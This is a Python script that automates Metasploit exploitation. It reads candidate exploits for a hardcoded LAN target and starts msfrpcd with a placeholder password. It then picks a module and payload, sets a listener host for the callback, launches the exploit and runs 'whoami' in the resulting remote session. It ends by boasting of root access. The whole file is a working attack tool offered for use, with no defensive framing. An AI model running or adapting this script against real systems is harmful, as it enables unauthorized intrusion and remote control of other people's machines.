#!/usr/bin/python3

import subprocess
import pprint
import json
from pymetasploit3.msfrpc import MsfRpcClient
import time

RED = "\033[1;31m"
YELLOW = "\033[33m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"
REVERSE = "\033[;7m"

LOW = "Low"
MEDIUM = BLUE + "Medium" + RESET
HIGH = YELLOW + "High" + RESET
CRITICAL = RED + "Critical" + RESET

SEVERITY_TEXT = {"LOW": LOW, "MEDIUM": MEDIUM, "HIGH": HIGH, "CRITICAL": CRITICAL}



def show_pwnguin():
    print(
        f"""
                                            (#(
                                        @@@/#&@&
                                  (&@@@,#&&@@&&&&&&&@@(
                             #@@@( %&&&&&&&@@@@@@@@@@
                         ,@@%/&&&&@@@@@@@@@@@@@@@@@@@@,
                       @@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@&
                    ,@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                   @@@&&@@&@#,,&@@@@@@@@@@@@@@@@%**%@@@@@@@@&
                 #@@@@@@%          %@@@@@@@@(          @@@@@@@,
                @@@@@@@   @@&        (@@@@,        @@&  /@@@@@@&
               @@@@@@@.    ,%@{RED}@@{RESET}&,     %     /@{RED}@@{RESET}@(,    #@@@@@@&
              @@@@@@@@    ..@@{RED}&..{RESET}@@@.    #@@{RED}@...@{RESET}@@,     @@@@@@@#
             &@@@@@@@@      {BLUE},@@@@@@{RESET}  .{YELLOW}%({RESET}  {BLUE}./@@@@@@,{RESET}      @@@@@@@@/
            /@@#&@@@@@            ,@{YELLOW}@&.  /@{RESET}@@            @@@@@&%@@
            @@/&&#@@@@@          @@{YELLOW}((/,*///%{RESET}@%          @@@@@%&&#@@
           .@&%@&@,@@@@@         .,/@{YELLOW}@/(((@{RESET}@,.          @@@@@.&&@#@@
           ,@(@@@&&,/@@@@.         ...{YELLOW}%@@/{RESET},.          ,@@@@,(&@@@&&@.
            """
    )



IP = "192.168.1.45"
CMD = "./explookup.sh " + IP
EXPLOIT_LIST = "./exploit_list"

show_pwnguin()
time.sleep(3)

# scan = subprocess.run(CMD, shell=True)

# if scan:
#     print("[i] Launching scan over @" + IP + " cmd :" + "CMD")

with open(EXPLOIT_LIST, "r+") as f:
    result = json.loads("[" + f.read() + "]")

titles=[]
for k,pwn in enumerate(result):
    titles.append([k,pwn["Title"]])

print("[~] Possible exploits :")
if titles:
    pprint.pprint(titles, underscore_numbers=True)
    print("\n")

choice = input("[~] Please select an exploit")
attack = titles[int(choice)][1][:-12]

print("[V] Exploit selected ! :")
print(attack)
print("\n")

print("Starting msfrpcd...")
proc = subprocess.run("msfrpcd -P yourpassword", shell=True)
time.sleep(5)

#proc = subprocess.run("msfdb reinit", shell=True)

client = MsfRpcClient("yourpassword", ssl=True)
print("\n")

modules = client.modules.search(attack)
#pprint.pprint(modules)

modulus = []
for mod in modules:
    modulus.append([mod['type'],mod['fullname']])

print("[~] Available modules :")
pprint.pprint(modulus)


exploit = client.modules.use(modulus[0][0], modulus[0][1])
print("[V] Selected payloads")

print(exploit.options)
print("\n")

plds = exploit.targetpayloads()
print("[~] Available payloads :")
pprint.pprint(plds)

payload = client.modules.use("payload", plds[7])
print("[V] Payload selected !")

print(payload.missing_required)
print("\n")


exploit["RHOSTS"] = input("Remote HOST : ")
payload["LHOST"] = "192.168.1.86"

print(exploit.execute(payload=payload))
time.sleep(10)

print(client.sessions.list)

shell = client.sessions.session("1")
shell.write("whoami")
print(shell.read())

print("[V] ROOT TA GRAND ****")